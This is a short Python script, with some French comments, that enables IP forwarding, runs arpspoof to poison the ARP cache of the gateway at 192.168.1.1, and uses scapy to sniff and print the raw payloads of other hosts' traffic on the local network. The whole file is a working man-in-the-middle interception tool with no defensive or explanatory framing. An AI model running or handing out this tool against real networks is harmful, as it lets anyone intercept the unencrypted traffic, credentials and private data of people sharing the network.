# coding: utf-8

from pip._vendor.distlib.compat import raw_input
from scapy.all import *
import sys
import os

from scapy.layers.dns import DNS
from scapy.layers.inet import IP

import netifaces as ni

ip_gateway = "192.168.1.1"

default_interface = "eth0"
ip_exclude = "192.168.1.201"

if default_interface != "":
    interface = default_interface

if default_interface == "":
    try:
        interface = raw_input("[*] Enter desired Interface : ")
    except KeyboardInterrupt:
        print("[*] User Requests Shutdown")
        print("[*] Exiting")
        sys.exit(1)

os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
os.system("arpspoof -i " + interface + " " + ip_gateway + " > /dev/null 2>&1 &")

# get local ip address
ni.ifaddresses(interface)
ip_local = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']

# une première IP à exclure est notre ip locale
print("1st IP to exclude from src = Local IP = ", ip_local)
# on peut aussi exclure une deuxième adresse ip
if ip_exclude != "":
    print("2nd IP to exclude from src = ", ip_exclude)

skipPacket = False


def query_sniff(pkt):
    global skipPacket
    if IP in pkt:
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        src_port = 0
        dst_port = 0
        if TCP in pkt:
            src_port = pkt[TCP].sport
            dst_port = pkt[TCP].dport
        if pkt.haslayer(Raw):
            if (ip_src != ip_local) and (ip_src != ip_exclude) and (ip_dst != ip_local) and (ip_dst != ip_exclude):
                if not skipPacket:
                    print(ip_src + ":" + str(src_port) + " -> " + ip_dst + ":" + str(dst_port) + " => " + "(" + str(pkt.getlayer(Raw)) + ")")
                    skipPacket = True
                else:
                    skipPacket = False


sniff(iface=interface, filter="", prn=query_sniff, store=0)
# sniff(iface=interface, filter="", prn=query_sniff, store=0)
print("\n[*] Shutting Down...")